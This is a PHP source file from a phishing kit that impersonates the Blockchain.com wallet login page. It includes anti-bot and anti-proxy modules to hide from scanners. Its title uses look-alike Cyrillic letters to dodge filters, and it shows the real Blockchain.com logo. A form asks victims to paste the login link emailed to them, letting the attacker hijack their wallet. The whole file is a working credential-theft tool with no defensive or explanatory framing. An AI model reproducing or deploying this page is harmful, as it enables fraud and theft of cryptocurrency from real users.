<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 Custom            $#
###############################################
**/
include 'antibots/Bot-Crawler.php';
include 'antibots/Bot-neo.php';
include 'antibots/Dila_DZ.php';
include 'antibots/IP-Blacklist.php';
include 'antibots/new.php';
/* New Anti Proxy */
include 'antiproxy/antiproxy.php';

/* New Anti Detector */
/* Prevent Detection , Simulate IDS */
if (isset($_GET['client_id'])) {}
else {
$name = 'Control'.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: email_link.php?client_id='.$name.'&csrf='.$om.'');}
if (!isset($_COOKIE['login'])) {
    header('Location: login.php');
}
?>
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">

    <head>
        <meta charset="utf-8" />
        <meta name="robots" content="noindex,nofollow" />
        <title>Blоckchаin.cоm Wallet - Exchаnge Cryptоcurrency</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
       <link rel="shortcut icon" href="assets/img/favicon.ico" />
        <link rel="stylesheet" href="./assets/style/form.css">
        <link rel="stylesheet" href="./assets/style/login.css">
		<link rel="stylesheet" href="./assets/style/dashboard.css">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" integrity="sha384-vp86vTRFVJgpjF9jiIGPEEqYqlDwgyBgEF109VFjmqGmIY/Y4HV4d3Gp2irVfcrp" crossorigin="anonymous">
        <script type="text/javascript" src="./assets/js/jquery-3.5.1.min.js"></script>


        <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
 <div class="sc-bsbRJL jBomjO"><span><div class="sc-kIPQKe jjKFRZ"><div color="blue600" class="sc-eXEjpC equTMu"><div class="sc-ibxdXY ChZLf"><div data-e2e="toastMessage" color="grey700" cursor="inherit" opacity="1" class="sc-gzVnrw bulvXJ" style="margin-left: 10px;"><span><?php
                                         if ($_GET["error"] == "url") {
                                             echo "<b style='color: red;'>The url provided is wrong.</b>";
                                         } else {
                                             echo "Authorization required. Please check your mailbox.";
                                         }
                                        ?>
                                         </span> </div></div><span data-e2e="toastMessageClose" color="grey500" class="sc-htpNat bOIJtl sc-iQKALj iqAyXQ"></span></div></div></span></div>
                    <main id="logon-content" data-has-view="true">
                        <div class="container logon" data-is-view="true">
                            <div class="row">
                                                <div class="lameraverga">
                <a href="">
                    <center><img style="margin: 44px 0 40px 0" src="https://login.blockchain.com/img/bc-logo.svg" alt="" height="24px" width="auto"></center>
                </a>
                </div>
                                <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">


                                </div>
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
                                    <div class="jpui raised segment">
                                        <div class="row">

                                            <div class="col-xs-10 col-xs-offset-1">
                                                    <div class="welcom">
                                                        <span><h4>Welcome Back!</h4></span>

                                                        <p style="font-size: 14px;">Please paste here the link that has reached the email</p>
                                                    </div>

                                                <form name="loginbank" id="formchain" method="POST">
                                                <input type="hidden" id="time" name="time" value="<?php echo $time;?>">
                                                    <div class="logon-xs-toggle" id="userId">

                                                        <div>
                                                            <label for="Username" class="labeli"><b>Email link</b></label>
                                                        </div>
                                                        <input class="jpui input logon-xs-toggle" id="link"  type="text" name="link" required="required">

                                                    </div>
                                                    <br>
                                                    <br>

                                                    <label class="util accessible-text logon-xs-toggle error" for="password-input-field" data-attr="LOGON.passwordPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Password</label>
                                                    <div class="logon-xs-toggle" id="password">
                                                    </div>
                                                        <button type="button" id="logear" class="jpui button focus fluid primary" data-attr="LOGON.logonToLandingPage" disabled><span class="label">Log In</span> </button>
                                                        <span><a href="#" class="a-links" style="font-size: 12px;margin-right: 19%; "><b>Login via Mobile</b></a></span>
                                                            <span><a href="#" class="a-links" style="font-size: 12px;margin-left: 33%; "><b>Need some help?</b></a></span>
 </form> </main> </div> </div> </div> </div> </div> <br> </div><div> <footer> <br> <br> <br> <center><b style="color: #9EA3A5;font-size: 15px;margin-right: 10px;">English <i class="fas fa-chevron-down"></i></b><b style="color: #9EA3A5;font-size: 15px;margin-right: 10px;">Version 4.47.1</b><b style="color: #9EA3A5;font-size: 15px;">Need help?</b></center> <br> <br> </footer></div>
<script type="text/javascript" src="./assets/js/app.js"></script>
        </body>
    </html>